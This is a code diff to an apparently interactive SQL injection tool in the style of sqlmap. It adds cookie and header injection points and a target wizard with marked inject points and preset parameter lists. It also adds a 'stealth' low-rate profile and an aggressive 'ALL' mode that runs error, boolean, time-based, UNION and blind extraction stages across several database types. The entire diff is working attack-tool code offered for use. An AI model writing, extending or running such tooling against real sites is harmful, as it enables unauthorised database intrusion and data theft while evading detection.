@@ -419,19 +419,50 @@ class Http:
             time.sleep(w)
 
     def request(self, param: str, value: str, *, replace: bool = False) -> Tuple[Optional[Any], float, str]:
-        """Inject value. Default: append to original param value (sqlmap-style)."""
+        """Inject value. Supports query/body params plus cookie:X and header:X."""
         self._rate()
         t0 = time.monotonic()
-        orig = self.st.orig.get(param, self.st.data.get(param, "1"))
-        final = value if replace else (orig + value)
+        orig = self.st.orig.get(param, "")
+        if not orig:
+            if param.startswith("cookie:"):
+                orig = self.st.cookies.get(param.split(":", 1)[1], "1")
+            elif param.startswith("header:"):
+                orig = self.st.headers.get(param.split(":", 1)[1], "1")
+            else:
+                orig = self.st.data.get(param, "1")
+        final = value if replace else (str(orig) + value)
         try:
+            cookies = dict(self.st.cookies)
+            headers = dict(self.st.headers)
+            if param.startswith("cookie:"):
+                ck = param.split(":", 1)[1]
+                cookies[ck] = final
+                if self.st.method == "GET":
+                    r = self.s.get(self.st.url, timeout=self.st.timeout, allow_redirects=True,
+                                   cookies=cookies, headers=headers)
+                else:
+                    r = self.s.post(self.st.url, data=self.st.data, timeout=self.st.timeout,
+                                    allow_redirects=True, cookies=cookies, headers=headers)
+                return r, time.monotonic() - t0, self.st.url
+            if param.startswith("header:"):
+                hk = param.split(":", 1)[1]
+                headers[hk] = final
+                if self.st.method == "GET":
+                    r = self.s.get(self.st.url, timeout=self.st.timeout, allow_redirects=True,
+                                   cookies=cookies, headers=headers)
+                else:
+                    r = self.s.post(self.st.url, data=self.st.data, timeout=self.st.timeout,
+                                    allow_redirects=True, cookies=cookies, headers=headers)
+                return r, time.monotonic() - t0, self.st.url
             if self.st.method == "GET":
                 url = inject(self.st.url, param, final)
-                r = self.s.get(url, timeout=self.st.timeout, allow_redirects=True)
+                r = self.s.get(url, timeout=self.st.timeout, allow_redirects=True,
+                               cookies=cookies, headers=headers)
                 return r, time.monotonic() - t0, url
             body = dict(self.st.data)
             body[param] = final
-            r = self.s.post(self.st.url, data=body, timeout=self.st.timeout, allow_redirects=True)
+            r = self.s.post(self.st.url, data=body, timeout=self.st.timeout, allow_redirects=True,
+                            cookies=cookies, headers=headers)
             return r, time.monotonic() - t0, self.st.url
         except Exception:
             return None, time.monotonic() - t0, self.st.url
@@ -464,12 +495,15 @@ class SQLiEngine:
 
     def baseline(self) -> None:
         # capture original values for every param
-        if self.st.method == "GET":
-            qs = parse_qs(urlparse(self.st.url).query, keep_blank_values=True)
-            for p in self.st.params:
+        qs = parse_qs(urlparse(self.st.url).query, keep_blank_values=True)
+        for p in self.st.params:
+            if p.startswith("cookie:"):
+                self.st.orig[p] = self.st.cookies.get(p.split(":", 1)[1], "1")
+            elif p.startswith("header:"):
+                self.st.orig[p] = self.st.headers.get(p.split(":", 1)[1], "1")
+            elif self.st.method == "GET":
                 self.st.orig[p] = (qs.get(p) or ["1"])[0]
-        else:
-            for p in self.st.params:
+            else:
                 self.st.orig[p] = self.st.data.get(p, "1")
         param = self.st.params[0]
         times, lengths, hashes = [], [], []
@@ -559,9 +593,9 @@ class SQLiEngine:
                 ))
                 break
 
-    def stage_time(self) -> None:
+    def stage_time(self, exhaust: bool = False) -> None:
         status(f"stage: time-based blind (sleep={self.st.sleep_s}s, threshold={self.st.time_threshold}s)", "info")
-        dbms_list = [self.st.dbms] if self.st.dbms else list(TIME_PAYLOADS.keys())
+        dbms_list = list(TIME_PAYLOADS.keys()) if exhaust or not self.st.dbms else [self.st.dbms]
         for dbms in dbms_list:
             for tag, tmpl in TIME_PAYLOADS.get(dbms, []):
                 payload = tmpl.format(d=self.st.sleep_s)
@@ -584,7 +618,8 @@ class SQLiEngine:
                         ))
                         if not self.st.dbms:
                             self.st.dbms = dbms
-                        return  # one confirmed time channel is enough
+                        if not exhaust:
+                            return  # one confirmed time channel is enough
 
     def stage_union(self) -> None:
         status("stage: UNION column enumeration", "info")
@@ -853,6 +888,22 @@ class SQLiEngine:
         self.stage_extract_mysql_error()
         self.stage_extract_blind_mysql()
 
+    def run_all(self) -> None:
+        """Everything: all techniques, all DBMS time banks, extract + blind."""
+        status("mode ALL — every technique, no early skip", "info")
+        # force multi-dbms time probes even if one dbms already hinted
+        saved_dbms = self.st.dbms
+        self.st.dbms = None
+        self.baseline()
+        self.stage_error_boolean()
+        self.stage_time(exhaust=True)
+        if saved_dbms and not self.st.dbms:
+            self.st.dbms = saved_dbms
+        self.stage_fingerprint()
+        self.stage_union()
+        self.stage_extract_mysql_error()
+        self.stage_extract_blind_mysql()
+
 
 # ── reporting ────────────────────────────────────────────────────────────────
 def save_report(st: EngineState) -> str:
@@ -889,31 +940,228 @@ def save_report(st: EngineState) -> str:
 
 # ── interactive ──────────────────────────────────────────────────────────────
 def ask_target() -> EngineState:
-    method = prompt("Method GET/POST", "GET").upper()
-    if method not in ("GET", "POST"):
-        method = "GET"
-    url = normalize_url(prompt("Target URL"))
-    data = {}
+    """Interactive target wizard — method, URL, param pick, cookies/headers, profile."""
+    print(f"  {C.FRAME}{C.B}┌── target wizard ──────────────────────────────┐{C.R}")
+
+    # ── 1) method ────────────────────────────────────────────────────────────
+    print(f"  {C.GOLD}[method]{C.R}")
+    print(f"    1  GET")
+    print(f"    2  POST")
+    print(f"    3  GET + cookies")
+    print(f"    4  POST + cookies")
+    mc = prompt("  choose", "1")
+    method = "POST" if mc in ("2", "4") else "GET"
+    want_cookies = mc in ("3", "4")
+
+    # ── 2) URL ───────────────────────────────────────────────────────────────
+    print(f"  {C.GOLD}[url]{C.R}  mark inject point with *  e.g. ?id=1*  or  /item/1*")
+    raw_url = prompt("  URL", "")
+    star_param = None
+    star_value = None
+    if "*" in raw_url:
+        # sqlmap-style: value ending with * is the injection point
+        # e.g. http://t/?id=1*  or  http://t/?id=1*&x=2
+        try:
+            p = urlparse(raw_url.replace("*", "§STAR§"))
+            qs = parse_qs(p.query, keep_blank_values=True)
+            for k, vals in qs.items():
+                for i, v in enumerate(vals):
+                    if "§STAR§" in v:
+                        star_param = k
+                        star_value = v.replace("§STAR§", "")
+                        qs[k][i] = star_value
+            # rebuild without marker
+            raw_url = urlunparse((p.scheme, p.netloc, p.path.replace("§STAR§", ""),
+                                  p.params, urlencode(qs, doseq=True), p.fragment))
+            status(f"inject marker on param '{star_param}' value='{star_value}'", "ok")
+        except Exception:
+            raw_url = raw_url.replace("*", "")
+    url = normalize_url(raw_url)
+
+    data: Dict[str, str] = {}
     if method == "POST":
-        status("POST body — JSON {\"id\":1} or id=1&x=2", "info")
-        data = parse_body(prompt("Body", "id=1"))
+        print(f"  {C.GOLD}[body]{C.R}  JSON {{\"id\":1}}  or  id=1&user=a")
+        print(f"    mark with * in value if needed: id=1*")
+        body_raw = prompt("  body", "id=1")
+        if "*" in body_raw and star_param is None:
+            # find marked field
+            tmp = body_raw
+            for part in body_raw.replace("{", "").replace("}", "").split("," if body_raw.strip().startswith("{") else "&"):
+                pass
+            data = parse_body(body_raw.replace("*", ""))
+            # detect which key had *
+            trial = parse_body(body_raw.replace("*", "§"))
+            clean = parse_body(body_raw.replace("*", ""))
+            for k, v in trial.items():
+                if "§" in str(v):
+                    star_param = k
+                    star_value = clean.get(k, "1")
+                    status(f"inject marker on POST param '{star_param}'", "ok")
+                    break
+            data = clean
+        else:
+            data = parse_body(body_raw.replace("*", ""))
+
     url, params, data = ensure_params(url, method, data)
-    extra = prompt("Extra params (comma)", "")
-    for name in [x.strip() for x in extra.split(",") if x.strip()]:
-        if method == "GET" and name not in params:
-            join = "&" if "?" in url else "?"
-            url = url + join + f"{name}=1"
-            params.append(name)
-        elif method == "POST":
-            data.setdefault(name, "1")
+
+    # ── 3) param selection ───────────────────────────────────────────────────
+    print(f"  {C.GOLD}[params]{C.R}  discovered: {C.B}{', '.join(params) or '(none)'}{C.R}")
+    print(f"    1  test ALL params")
+    print(f"    2  pick by number")
+    print(f"    3  type names (comma)")
+    print(f"    4  common web set  (id,page,cat,uid,user,search,q,pid)")
+    print(f"    5  numeric only    (id,uid,pid,page,cat,item,product)")
+    if star_param:
+        print(f"    6  marked only     ({star_param})")
+    pc = prompt("  choose", "6" if star_param else "1")
+
+    COMMON = ["id", "page", "cat", "uid", "user", "search", "q", "pid", "item", "product", "cid", "sid"]
+    NUMERIC = ["id", "uid", "pid", "page", "cat", "item", "product", "cid", "sid", "order", "num"]
+
+    if pc == "2":
+        for i, name in enumerate(params, 1):
+            print(f"    {C.NEON}{i}{C.R}  {name}")
+        picks = prompt("  numbers (e.g. 1,3)", "1")
+        chosen = []
+        for tok in picks.split(","):
+            tok = tok.strip()
+            if tok.isdigit() and 1 <= int(tok) <= len(params):
+                chosen.append(params[int(tok) - 1])
+        params = chosen or params[:1]
+    elif pc == "3":
+        names = [x.strip() for x in prompt("  names", params[0] if params else "id").split(",") if x.strip()]
+        # add missing into url/data
+        for name in names:
             if name not in params:
+                if method == "GET":
+                    join = "&" if "?" in url else "?"
+                    url = url + join + f"{name}=1"
+                else:
+                    data.setdefault(name, "1")
                 params.append(name)
-    threads = max(1, min(20, int(prompt("Threads", "6") or "6")))
-    delay = float(prompt("Delay sec", "0.05") or "0.05")
-    sleep_s = max(2, min(10, int(prompt("Time-blind sleep sec", "5") or "5")))
-    th = float(prompt("Time threshold sec", "4.5") or "4.5")
+        params = [n for n in names if n in params or True]
+        # rebuild unique
+        seen = []
+        for n in names:
+            if n not in seen:
+                seen.append(n)
+        params = seen
+    elif pc == "4":
+        for name in COMMON:
+            if name not in params:
+                if method == "GET":
+                    join = "&" if "?" in url else "?"
+                    url = url + join + f"{name}=1"
+                else:
+                    data.setdefault(name, "1")
+                params.append(name)
+        params = [n for n in COMMON]
+        status(f"using common set: {params}", "info")
+    elif pc == "5":
+        for name in NUMERIC:
+            if name not in params:
+                if method == "GET":
+                    join = "&" if "?" in url else "?"
+                    url = url + join + f"{name}=1"
+                else:
+                    data.setdefault(name, "1")
+                params.append(name)
+        params = list(NUMERIC)
+        status(f"using numeric set: {params}", "info")
+    elif pc == "6" and star_param:
+        params = [star_param]
+    else:
+        # all — keep params as discovered
+        pass
+
+    # ── 4) cookies ───────────────────────────────────────────────────────────
+    cookies: Dict[str, str] = {}
+    if want_cookies or yn("  inject into cookies too?", False):
+        print(f"  {C.GOLD}[cookies]{C.R}  format: name=value; name2=value2  (mark value with *)")
+        raw = prompt("  cookie header", "")
+        if raw:
+            for part in raw.split(";"):
+                part = part.strip()
+                if not part:
+                    continue
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    k, v = k.strip(), v.strip()
+                    if "*" in v:
+                        v = v.replace("*", "")
+                        star_c = f"cookie:{k}"
+                        cookies[k] = v
+                        if star_c not in params:
+                            params.append(star_c)
+                        status(f"cookie inject point: {k}", "ok")
+                    else:
+                        cookies[k] = v
+                else:
+                    cookies[part] = ""
+            # also offer to test all cookies
+            if cookies and yn("  test all cookie keys as inject points?", True):
+                for k in cookies:
+                    tag = f"cookie:{k}"
+                    if tag not in params:
+                        params.append(tag)
+
+    # ── 5) custom headers ────────────────────────────────────────────────────
+    headers: Dict[str, str] = {}
+    if yn("  add custom headers / test header inject?", False):
+        print(f"  {C.GOLD}[headers]{C.R}  one per line, empty line to finish")
+        print(f"    e.g. X-Forwarded-For: 1*   or   User-Agent: test")
+        while True:
+            line = prompt("  header", "")
+            if not line:
+                break
+            if ":" not in line:
+                status("need Name: value", "warn")
+                continue
+            hk, hv = line.split(":", 1)
+            hk, hv = hk.strip(), hv.strip()
+            if "*" in hv:
+                hv = hv.replace("*", "")
+                headers[hk] = hv
+                tag = f"header:{hk}"
+                if tag not in params:
+                    params.append(tag)
+                status(f"header inject point: {hk}", "ok")
+            else:
+                headers[hk] = hv
+
+    # ── 6) speed profile ─────────────────────────────────────────────────────
+    print(f"  {C.GOLD}[profile]{C.R}")
+    print(f"    1  fast     threads=12 delay=0.02 sleep=3  threshold=2.5")
+    print(f"    2  normal   threads=6  delay=0.05 sleep=5  threshold=4.5")
+    print(f"    3  stealth  threads=2  delay=0.4  sleep=6  threshold=5.0")
+    print(f"    4  custom")
+    pr = prompt("  choose", "2")
+    profiles = {
+        "1": (12, 0.02, 3, 2.5),
+        "2": (6, 0.05, 5, 4.5),
+        "3": (2, 0.4, 6, 5.0),
+    }
+    if pr in profiles:
+        threads, delay, sleep_s, th = profiles[pr]
+    else:
+        threads = max(1, min(20, int(prompt("  threads", "6") or "6")))
+        delay = float(prompt("  delay sec", "0.05") or "0.05")
+        sleep_s = max(2, min(12, int(prompt("  time-blind sleep", "5") or "5")))
+        th = float(prompt("  time threshold", "4.5") or "4.5")
+
+    # ── summary ──────────────────────────────────────────────────────────────
+    print(f"  {C.FRAME}└──────────────────────────────────────────────{C.R}")
+    status(f"{method} {url}", "info")
+    status(f"params → {params}", "info")
+    if cookies:
+        status(f"cookies → {list(cookies.keys())}", "info")
+    if headers:
+        status(f"headers → {list(headers.keys())}", "info")
+    status(f"profile threads={threads} delay={delay} sleep={sleep_s}s thr={th}", "info")
+
     return EngineState(
         url=url, method=method, data=data, params=params,
+        cookies=cookies, headers=headers,
         threads=threads, delay=delay, sleep_s=sleep_s, time_threshold=th,
     )
 
@@ -942,6 +1190,7 @@ def run_menu_action(mode: str) -> None:
         "union": "UNION — column count + version probe",
         "time": "TIME-BASED BLIND",
         "error": "ERROR-BASED DETECTION",
+        "all": "ALL — every technique, multi-DBMS, extract + blind",
     }
     print(f"  {C.B}{titles.get(mode, mode)}{C.R}\n")
     st = ask_target()
@@ -968,6 +1217,8 @@ def run_menu_action(mode: str) -> None:
             eng.baseline()
             eng.stage_error_boolean()
             eng.stage_fingerprint()
+        elif mode == "all":
+            eng.run_all()
         else:
             eng.run_full()
     except KeyboardInterrupt:
@@ -986,6 +1237,7 @@ def run():
             ("4", "UNION column enum + version"),
             ("5", "Time-based blind only"),
             ("6", "Error-based only"),
+            ("7", "ALL — every technique (aggressive)"),
             ("0", "Back"),
         ])
         c = prompt(">>", "0")
@@ -1003,6 +1255,8 @@ def run():
             run_menu_action("time")
         elif c == "6":
             run_menu_action("error")
+        elif c == "7":
+            run_menu_action("all")
         else:
             status("invalid", "err")
             time.sleep(0.4)
